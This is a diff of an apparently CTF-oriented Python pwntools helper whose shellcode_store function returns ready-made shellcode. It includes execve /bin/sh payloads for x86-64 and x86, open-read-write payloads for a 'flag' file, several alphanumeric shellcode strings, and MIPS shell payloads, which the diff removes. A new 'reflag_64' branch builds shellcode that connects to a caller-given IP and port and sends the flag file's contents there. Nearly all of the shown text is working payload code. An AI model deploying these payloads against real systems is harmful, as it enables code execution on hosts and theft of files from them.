@@ -153,54 +153,64 @@ def load(program_name, ip_port="", remote_libc=""):
                 libc=ELF(libc_info)
             return p, e, libc
 
-def shellcode_store(demand):
-    if demand =='shell_64':
-        shellcode=b"\x48\x31\xC0\x6A\x3B\x58\x48\x31\xFF\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x48\x31\xF6\x56\x57\x54\x5F\x48\x31\xD2\x0F\x05"
+
+def shellcode_store(demand, *args):
+    if demand == 'shell_64':
+        shellcode = b"\x48\xC7\xC0\x3B\x00\x00\x00\x49\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x41\x50\x48\x31\xF6\x48\x31\xD2\x54\x5F\x0F\x05"
         return shellcode
-    elif demand=='shell_32':
-        shellcode=b"\x31\xC9\x31\xD2\x31\xDB\x53\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x31\xC0\x6A\x0B\x58\xCD\x80"
+    elif demand == 'shell_32':
+        shellcode = b"\x31\xC9\x31\xD2\x31\xDB\x53\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x31\xC0\x6A\x0B\x58\xCD\x80"
         return shellcode
-    elif demand=='orw1_64':
-        shellcode=b"\x6A\x00\x5F\x6A\x03\x58\x0F\x05\x48\xBE\x2F\x66\x6C\x61\x67\x00\x00\x00\x56\x54\x5E\x6A\x00\x5F\x6A\x00\x5A\x68\x01\x01\x00\x00\x58\x0F\x05\x50\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05"
+    elif demand == 'orw1_64':
+        shellcode = b"\x6A\x00\x5F\x6A\x03\x58\x0F\x05\x48\xBE\x2F\x66\x6C\x61\x67\x00\x00\x00\x56\x54\x5E\x6A\x00\x5F\x6A\x00\x5A\x68\x01\x01\x00\x00\x58\x0F\x05\x50\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05"
         return shellcode
-    elif demand=='orw_64':
-        shellcode=b"\x68\x66\x6C\x61\x67\x54\x5F\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x50\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05"
+    elif demand == 'orw_64':
+        shellcode = b"\x68\x66\x6C\x61\x67\x54\x5F\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x50\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05"
         return shellcode
-    elif demand=='orw_32':
-        shellcode=b"\x6A\x00\x68\x66\x6C\x61\x67\x54\x5B\x31\xC9\x6A\x05\x58\xCD\x80\x50\x5B\x54\x59\x6A\x50\x5A\x6A\x03\x58\xCD\x80\x6A\x01\x5B\x54\x59\x6A\x50\x5A\x6A\x04\x58\xCD\x80"
+    elif demand == 'orw_32':
+        shellcode = b"\x6A\x00\x68\x66\x6C\x61\x67\x54\x5B\x31\xC9\x6A\x05\x58\xCD\x80\x50\x5B\x54\x59\x6A\x50\x5A\x6A\x03\x58\xCD\x80\x6A\x01\x5B\x54\x59\x6A\x50\x5A\x6A\x04\x58\xCD\x80"
         return shellcode
-    elif demand=='str_rsp':
-        shellcode="Th0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00"
+    elif demand == 'str_rsp':
+        shellcode = "Th0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00"
         return shellcode
-    elif demand=='str_esp':
-        shellcode="TYhffffk4diFkDql02Dqm0D1CuEE2O0Z2G7O0u7M041o1P0R7L0Y3T3C1l000n000Q4q0f2s7n0Y0X020e3j2r1k0h0i013A7o4y3A114C1n0z0h4k4r0y07"
+    elif demand == 'str_esp':
+        shellcode = "TYhffffk4diFkDql02Dqm0D1CuEE2O0Z2G7O0u7M041o1P0R7L0Y3T3C1l000n000Q4q0f2s7n0Y0X020e3j2r1k0h0i013A7o4y3A114C1n0z0h4k4r0y07"
         return shellcode
-    elif demand=='str_rdi':
-        shellcode="Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
+    elif demand == 'str_rdi':
+        shellcode = "Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
         return shellcode
-    elif demand=='str_rsi':
-        shellcode="Vh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00"
+    elif demand == 'str_rsi':
+        shellcode = "Vh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00"
         return shellcode
-    elif demand=='str_rax':
-        shellcode="Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
+    elif demand == 'str_rax':
+        shellcode = "Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
         return shellcode
-    elif demand=='str_rbp':
-        shellcode="Uh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00"
+    elif demand == 'str_rbp':
+        shellcode = "Uh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00"
         return shellcode
-    elif demand=='str_rbx':
-        shellcode="Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00"
+    elif demand == 'str_rbx':
+        shellcode = "Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00"
         return shellcode
-    elif demand=='str_rcx':
-        shellcode="Qh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00"
+    elif demand == 'str_rcx':
+        shellcode = "Qh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00"
         return shellcode
-    elif demand=='mips32_big_shell':
-        shellcode=b"\x24\x06\x01\x11\x04\xd0\xff\xff\x24\x06\x00\x00\x27\xbd\xff\xe0\x27\xe4\x00\x14\x24\x05\x00\x00\x24\x02\x0f\xab\x00\x00\x00\x0c/bin/sh"
+
+    elif demand == 'reflag_64':
+        socket = args[0]
+        ip, port = socket.split()
+        ip_hex = ''.join(reversed([hex(int(num))[2:].zfill(2) for num in ip.split('.')]))
+        port_hex = hex(int(port))[2:].zfill(4)  # 将端口号转换为四位的十六进制字符串
+        port_hex_split = [port_hex[i:i + 2] for i in range(0, len(port_hex), 2)]  # 按两个数字分割十六进制字符串
+        port_hex = ''.join(reversed(port_hex_split))
+        socket = "mov rbx," + "0x" + ip_hex + port_hex + "0002"
+        result = asm(socket)
+        shellcode = b"\x6A\x02\x5F\x6A\x01\x5E\x48\x31\xD2\x6A\x29\x58\x0F\x05\x50\x5F\x6A\x10\x5A" + result + b"\x53\x54\x5E\x6A\x2A\x58\x0F\x05"
+        shellcode += b"\x50\x5B\x68\x66\x6C\x61\x67\x54\x5F\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x50\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x53\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05"
         return shellcode
-    elif demand=='mips32_little_shell':
-        shellcode=b"\x11\x01\x06\x24\xff\xff\xd0\x04\x00\x00\x06\x24\xe0\xff\xbd\x27\x14\x00\xe4\x27\x00\x00\x05\x24\xab\x0f\x02\x24\x0c\x00\x00\x00/bin/sh"
-        return shellcode
+
     else:
-        assert False,"Pass in unrecognized parameter"
+        assert False, "Pass in unrecognized parameter"
+
 
 def search_og(index):
     global libc_info
